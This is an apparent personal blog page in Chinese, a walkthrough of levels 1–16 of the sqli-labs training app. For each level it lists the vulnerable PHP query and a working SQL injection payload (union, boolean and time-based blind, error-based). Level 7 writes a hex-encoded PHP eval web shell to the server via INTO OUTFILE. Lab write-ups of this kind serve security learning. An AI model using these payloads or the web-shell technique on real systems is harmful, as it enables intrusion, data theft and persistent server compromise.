@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>sqlilab | Yyx</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1622952381444">
+<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="sqli-lab
+第一关
+$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+// ?id=-1' union select 1,2,database()--+
+
+第..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://www.yyxyy.xyz/">
+        <img src="https://www.yyxyy.xyz//images/avatar.png?v=1622952381444" class="site-logo">
+        <h1 class="site-title">Yyx</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      记得在这杂乱的生活里，带点微笑
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">sqlilab</h2>
+            <div class="post-date">2021-06-06</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="sqli-lab">sqli-lab</h1>
+<h4 id="第一关">第一关</h4>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+// ?id=-1' union select 1,2,database()--+
+</code></pre>
+<h4 id="第二关">第二关</h4>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+// ?id=-1 union select 1,2,database()--+
+</code></pre>
+<h4 id="第三关">第三关</h4>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;;
+// ?id=-1') union select 1,2,database()--+
+
+</code></pre>
+<h4 id="第四关">第四关</h4>
+<pre><code class="language-php">$id = '&quot;' . $id . '&quot;';
+$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;
+//?id=-1&quot;) union select 1,2,database() --+
+
+</code></pre>
+<h4 id="第五关">第五关</h4>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;//无回显
+//?id=1' and if(length(database())=8,sleep(5),1) --+  if(exp1,exp2,exp3) exp1为真，返回exp2。
+//?id=1' and if(left(database(),1)='s',sleep(5),1)
+方法二
+//id=' and left(select database(),1)&gt;'s' --+  bool注入，更具页面回显判断，二分法更快。
+</code></pre>
+<h4 id="第六关">第六关</h4>
+<pre><code class="language-php">$id = '&quot;'.$id.'&quot;';
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+
+和第五关一样，只有双引号改变。
+</code></pre>
+<h4 id="第七关">第七关</h4>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1&quot;;
+//?id=1')) union select null,0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e,null into outfile 'e:\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs\\t.php' %23
+</code></pre>
+<h4 id="第八关">第八关</h4>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+只有一个回显。盲注
+    ?id=1' and left(database(),1)='s' %23
+    ?id=1' and ascii(substr(database() ,1,1)) = 115 %23
+    ?id=1' and substr((select database()) ,1,1) ='s' %23
+    
+</code></pre>
+<h4 id="第九关">第九关</h4>
+<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+时间盲注0.0
+    ?id=1' and if(length(database())=8,sleep(5),1) %23
+    ?id=1' and if(left(database(),1)='s',sleep(5),1) %23
+    ?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1) %23
+</code></pre>
+<h4 id="第十关">第十关</h4>
+<pre><code class="language-php">$id = '&quot;'.$id.'&quot;';
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+时间盲注
+    换成了‘&quot;’，其它没变。
+</code></pre>
+<h4 id="第十一关">第十一关</h4>
+<pre><code class="language-php">$uname=$_POST['uname'];
+$passwd=$_POST['passwd'];
+@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;;
+if($row)
+{
+    	echo 'Your Login name:'. $row['username'];
+		echo &quot;&lt;br&gt;&quot;;
+		echo 'Your Password:' .$row['password'];
+}
+
+uname=admin' order by 2#&amp;passwd=12346
+uname=admn' union select 1,2#&amp;passwd=12346
+uname=admn' union select 1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata) #&amp;passwd=123456
+</code></pre>
+<h4 id="第十二关">第十二关</h4>
+<pre><code class="language-php">$uname='&quot;'.$uname.'&quot;';
+$passwd='&quot;'.$passwd.'&quot;'; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+// 和十一关差不多
+uname=admin') order by 2#&amp;passwd=12346
+</code></pre>
+<h4 id="第十三关">第十三关</h4>
+<pre><code class="language-php">@$sql=&quot;SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1&quot;;
+//单引号和括号闭合，但是没回显，但是有报错，考虑报错注入
+uname=admin') and extractvalue(1,concat(0x7e,(select database())))  and ('
+</code></pre>
+<h4 id="第十四关">第十四关</h4>
+<pre><code class="language-php">$uname='&quot;'.$uname.'&quot;';
+$passwd='&quot;'.$passwd.'&quot;'; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;
+//双引号报错，没回显，报错注入
+uname=admin&quot; and extractvalue(1,concat(0x7e,(select database())))  and &quot;
+</code></pre>
+<h4 id="第十五关">第十五关</h4>
+<pre><code class="language-php">@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;;
+//单引号，没有报错没有回显，想到的方法就是时间盲注
+uname=admin' and if(length(database())=8,sleep(5),1)#
+uname=admin' and if(left(database(),1)='s',sleep(5),1)#
+//....
+    
+</code></pre>
+<h4 id="第十六关">第十六关</h4>
+<pre><code class="language-php">$uname='&quot;'.$uname.'&quot;';
+$passwd='&quot;'.$passwd.'&quot;'; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
+//双引号＋括号，没有回显和报错，只想到了时间盲注
+uname=admin&quot;) and if(length(database())=8,sleep(5),1)#
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://www.yyxyy.xyz/post/xctf-4th-cyberearth/">
+                  <h3 class="post-title">
+                    XCTF 4th-CyberEarth
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
